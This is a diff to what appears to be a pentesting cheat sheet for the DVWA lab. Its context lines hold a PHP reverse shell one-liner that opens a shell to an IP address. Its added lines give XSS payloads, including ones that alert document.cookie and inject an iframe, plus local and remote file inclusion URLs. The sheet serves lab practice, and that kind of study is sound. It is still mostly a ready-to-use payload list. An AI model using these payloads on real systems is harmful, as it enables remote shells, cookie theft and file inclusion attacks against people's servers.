@@ -10,13 +10,17 @@ Reverse shell one-liners:
 <?php $s=fsockopen("192.168.16.124",1234);exec("sh<&3>&3 2>&3") ;?>
 
 
-XSS
----
+XSS (CROSS SITE SCRIPTING)
+--------------------------
 
 ```javascript
 <script>alert("XSS")</script>
 <script>alert(document.cookie)</script>
 ```
+
+iframe: `<iframe src="http://www.cnn.com"></iframe>`
+Stored cookieL: `<script>alert(document.cookie)</script>`
+
 
 SQL INJECTION
 -------------
@@ -104,7 +108,8 @@ COMMAND INJECTION
 LOCAL FILE INCLUSION
 --------------------
 
-Example: `http://localhost/dvwa/vulnerabilities/fi/?page=include.php`
+Local: `http://localhost/dvwa/vulnerabilities/fi/?page=include.php`
+Remote: `http://localhost/dvwa/vulnerabilities/fi/?page=http://google.com/robots.txt`
 
 FILE UPLOAD
 -----------
